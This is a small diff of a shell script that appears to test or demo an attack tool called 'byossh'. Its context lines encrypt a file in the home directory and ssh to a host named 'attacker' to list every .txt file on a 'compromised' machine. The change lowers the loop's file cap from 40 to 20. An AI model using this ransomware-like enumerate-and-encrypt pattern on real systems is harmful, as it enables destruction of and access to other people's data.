@@ -62,7 +62,7 @@ encrypt_file "$HOME/testing.txt"
 total=0
 output=$(ssh attacker "byossh compromised 'find / | grep .txt$'" | sed '1d')
 printf "%s\n" "$output" | while IFS= read -r file; do
-    if [ "$total" = "40" ]; then
+    if [ "$total" = "20" ]; then
         break
     fi
     total=$((total + 1))
